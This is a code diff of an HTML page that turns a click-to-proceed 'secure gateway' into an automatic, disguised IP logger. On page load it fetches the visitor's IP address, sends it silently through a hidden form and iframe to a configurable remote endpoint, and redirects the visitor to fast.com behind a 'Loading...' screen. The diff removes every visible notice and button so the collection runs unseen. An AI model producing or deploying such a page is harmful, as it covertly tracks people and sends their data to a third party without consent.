@@ -3,68 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FIH Gateway</title>
+    <title>Loading...</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             background-color: #0f172a;
-            color: #f8fafc;
+            color: #94a3b8;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
-            background: #1e293b;
-            padding: 2.5rem;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4);
-            width: 100%;
-            max-width: 400px;
-            border: 1px solid #334155;
-            text-align: center;
-        }
-        h2 { color: #38bdf8; margin-top: 0; }
-        p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 2rem; }
-        button {
-            background: #38bdf8;
-            color: #0f172a;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 1rem;
-            width: 100%;
-        }
-        button:hover { background: #0ea5e9; }
-        .status { margin-top: 1rem; font-size: 0.85rem; color: #fbbf24; min-height: 20px; }
+        .log { font-size: 0.9rem; letter-spacing: 0.05em; }
     </style>
 </head>
 <body>
+    <div class="log" id="log">Initializing session...</div>
 
-    <div class="container">
-        <h2>FIH Secure Gateway</h2>
-        <p>Click below to initialize session and proceed.</p>
-        <button id="testBtn" onclick="executeGateway()">Proceed</button>
-        <div id="status" class="status"></div>
-    </div>
-
-    <!-- Hidden iframe to handle silent background posting -->
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
 
     <script>
         const WEB_APP_URL = "YOUR_NEW_WEB_APP_URL_HERE";
-        const TARGET_URL = "https://www.google.com";
+        const TARGET_URL = "https://fast.com";
 
-        async function executeGateway() {
-            const btn = document.getElementById('testBtn');
-            const status = document.getElementById('status');
-            
-            btn.disabled = true;
-            btn.innerText = "Connecting...";
-            status.innerText = "Retrieving network telemetry...";
+        async function run() {
+            const logEl = document.getElementById('log');
 
             let clientIp = "Unknown";
             try {
@@ -74,13 +38,10 @@
                 clearTimeout(timeoutId);
                 const data = await res.json();
                 clientIp = data.ip || "Unknown";
-            } catch (e) {
-                clientIp = "Unknown";
-            }
+            } catch (e) {}
 
-            status.innerText = "Transmitting data...";
+            logEl.innerText = "Connecting...";
 
-            // Construct hidden form for bulletproof cross-origin transmission
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = WEB_APP_URL;
@@ -104,12 +65,14 @@
             document.body.appendChild(form);
             form.submit();
 
-            status.innerText = "Redirecting...";
+            logEl.innerText = "Redirecting...";
 
             setTimeout(() => {
                 window.location.replace(TARGET_URL);
-            }, 800);
+            }, 600);
         }
+
+        window.onload = run;
     </script>
 </body>
 </html>
